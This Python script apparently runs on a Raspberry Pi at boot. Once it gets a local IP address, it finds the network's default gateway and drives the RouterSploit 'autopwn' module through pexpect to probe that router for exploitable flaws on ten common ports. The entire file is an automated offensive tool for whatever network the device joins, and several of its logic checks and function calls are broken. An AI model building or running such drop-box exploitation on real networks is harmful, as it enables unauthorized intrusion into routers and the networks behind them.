import os, sys, operator, socket, subprocess, threading, time, pexpect, logging
# from __future__ import absolute_import
# from __future__ import print_function
# from __future__ import unicode_literals

import pexpect
import re

logger = logging.getLogger('simple_example')
logger.setLevel(logging.DEBUG)
# create file handler which logs even debug messages
fh = logging.FileHandler('/root/logger_sucks.log')
fh.setLevel(logging.DEBUG)
# create console handler with a higher log level
ch = logging.StreamHandler()
ch.setLevel(logging.ERROR)
# create formatter and add it to the handlers
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
fh.setFormatter(formatter)
# add the handlers to logger
logger.addHandler(ch)
logger.addHandler(fh)

port_list = ['80','443','8080','81','4567','9999','22','23','25','53']
def bash_command(cmd):
    subprocess.call(cmd,shell=True,executable="/bin/bash")
    return
def rsf_command_sequence_2(port,gateway_ip):

    port = str(port)
    cmd = "python /usr/local/bin/rsf.py"
    child = pexpect.spawn(cmd, logfile=sys.stdout, timeout=3000)
    child.expect("rsf")

    child.sendline('use scanners/autopwn')

    child.expect('AutoPwn')
    # target_ip = "10.0.1.1"
    target_line = "set target {0}".format(str(gateway_ip))
    child.sendline(target_line)

    child.expect("{'target':")
    # port = "80"
    target_port = "set port {0}".format(str(port))
    child.sendline(target_port)

    child.expect("'port':")

    child.sendline('run')
    # counter += 1
    child.expect('Could not confirm any vulnerablity')
    child.sendline('exit')

    return
def rsf_command_sequence(port_list):
    cmd = """ip route list | egrep -i "default|via" | awk '{print $3}' > /root/ip_address.log"""
    # gateway_ip = bash_command(cmd)
    # gateway_ip = str(gateway_ip)
    subprocess.call(cmd,shell=True,executable="/bin/bash")
    cmd = """cat ip_address.log"""
    r = open('ip_address.log','r')
    read = r.readlines()
    r.close()
    gateway_ip = str(read[0]).replace('\\n','')
    octets = gateway_ip.split('.')
    print gateway_ip
    # of all the things Python can do, it cannot parse a IP address! Unbelievable
    # otherwise it returns only 0
    gateway_ip = str("""{0}.{1}.{2}.{3}""".format(
        str(octets[0]),
        str(octets[1]),
        str(octets[2]),
        str(octets[3])
    ))
    counter = 0
    for port in port_list:

        rsf_command_sequence_2(port, gateway_ip)

    print "WE'RE DONE HERE, GET OUT!"
    return
#rsf_command_sequence("10.0.1.1", "80")

def pull_routing_path(port_list, yourself):
    os.system('clear')
    # cmd = """ip route | grep via | awk '{print $3}'"""
    cmd = """ip route list | egrep -i "default|via" | awk '{print $3}'"""
    gateway_ip = bash_command(cmd)
    gateway_ip = str(gateway_ip)
    #gateway_ips = gateway_ip.split('\n')
    # list_gw_ips = gateway_ip.splitlines()
    cmd = """ifconfig -a | grep -i "inet" | egrep -v "inet6|127.0.0.1|0.0.0.0" | awk '{print $2}'"""
    personal_ip = bash_command(cmd)
    personal_ip = str(personal_ip)
    # list_personal_ips = personal_ip.splitlines()

    # for gw in gateway_ips:
    #
    #     gw = str(gateway_ips)
    for port in port_list:
        port = str(port.strip())
        rsf_command_sequence(gateway_ip, port)
    # for gw:
    #     gw = str(gw.strip())
    #     print gw
    #     for port in port_list:
    #         port = str(port.strip())
    #         print gw
    #         rsf_command_sequence(gw, port)
    return

def detect_network():
    # detects the assignment  of a local IP, which guarantees that you have been connected to the LOCAL network, good enough for wireless exploitation
    # time.sleep(5) # checks every 5 seconds
    time.sleep(3)
    detection_test = "ifconfig | grep inet | awk '{{print $2}}'"
    cmd = """ifconfig | egrep -i "inet " | grep -v "127.0.0.1" | awk '{print $2}'"""
    yourself = bash_command(detection_test)
    yourself = str(yourself)
    if yourself != "" or None or 0:
        if yourself != "0.0.0.0" or '127.0.0.1' or 'ether':

            # success_str = "SUCCESSFULLY CONNECTED: Your ip address is: {0}".format(str(yourself))
            # print(success_str)
            # pull_routing_path(port_list, yourself)
            rsf_command_sequence(port_list)
        else:
            detect_network()
    else:
        detect_network()
    return
print("Raspberry Pi just booted. Scanning for networks to login to.")
detect_network()
